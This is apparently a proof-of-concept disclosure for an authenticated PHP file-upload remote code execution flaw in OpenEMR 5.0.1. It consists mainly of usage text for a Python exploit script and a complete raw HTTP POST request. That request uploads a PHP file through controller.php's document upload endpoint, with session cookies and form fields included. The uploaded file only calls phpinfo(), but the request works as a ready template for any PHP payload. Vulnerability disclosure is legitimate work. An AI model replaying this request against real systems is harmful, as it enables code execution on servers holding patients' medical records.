# OpenEMR Remote Code Execution Vulnerability
[OpenEMR 5.0.1](https://www.open-emr.org/) allows an authenticated attacker to upload and execute malicious php codes.

# PoC 
```
usage: openemr_rce_poc.py [-h] [--target TARGET] [--username USERNAME]
                          [--password PASSWORD]

optional arguments:
  -h, --help            show this help message and exit
  --target TARGET, -t TARGET
                        give OpenEMR URL
  --username USERNAME, -u USERNAME
                        give OpenEMR username
  --password PASSWORD, -p PASSWORD
                        give OpenEMR password
```
# CVE-2020-XXXXX
To exploit vulnerability, someone could use 'http://[HOST]/controller.php?document&upload&patient_id=00&parent_id=4&' post request to upload malicious php codes.

```
POST /openemr-5.0.1/controller.php?document&upload&patient_id=00&parent_id=4& HTTP/1.1
Host: 172.16.155.140
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:79.0) Gecko/20100101 Firefox/79.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://172.16.155.140/openemr-5.0.1/controller.php?document&upload&patient_id=00&parent_id=4&
Content-Type: multipart/form-data; boundary=---------------------------141194333536146869123947219434
Content-Length: 842
Origin: http://172.16.155.140
DNT: 1
Connection: close
Cookie: OpenEMR=t1lugo5qrbhv7mc2c3q9ricsnl; TreeMenuBranchStatus=objTreeMenu_1_node_1_9; PHPSESSID=dfhapc4v0bskt7pcpmc2j93agq; LS-VQGNEIWNPEBSNBWE=6rm848pgjj78hhecpb9roo8af1; YII_CSRF_TOKEN=OWYyM0lybGFtRF9wcHRkZ1lldF9WblhoVHlVNk5HRW3WMnZhghJHNtBjyIuALM94Ww3gltGLoeKETBSfevfbCw%3D%3D
Upgrade-Insecure-Requests: 1

-----------------------------141194333536146869123947219434
Content-Disposition: form-data; name="MAX_FILE_SIZE"

64000000
-----------------------------141194333536146869123947219434
Content-Disposition: form-data; name="file[]"; filename="shell_info.php"
Content-Type: text/php

<?php
phpinfo();
?>
-----------------------------141194333536146869123947219434
Content-Disposition: form-data; name="destination"


-----------------------------141194333536146869123947219434
Content-Disposition: form-data; name="patient_id"

00
-----------------------------141194333536146869123947219434
Content-Disposition: form-data; name="category_id"

4
-----------------------------141194333536146869123947219434
Content-Disposition: form-data; name="process"

true
-----------------------------141194333536146869123947219434--

```

![alt tag](https://emreovunc.com/blog/en/openemr_5_0_1_php_shell_upload_001.png)

![alt tag](https://emreovunc.com/blog/en/openemr_5_0_1_php_shell_upload_004.png)

![alt tag](https://emreovunc.com/blog/en/openemr_5_0_1_php_shell_upload_002.png)

![alt tag](https://emreovunc.com/blog/en/openemr_5_0_1_php_shell_upload_003.png)


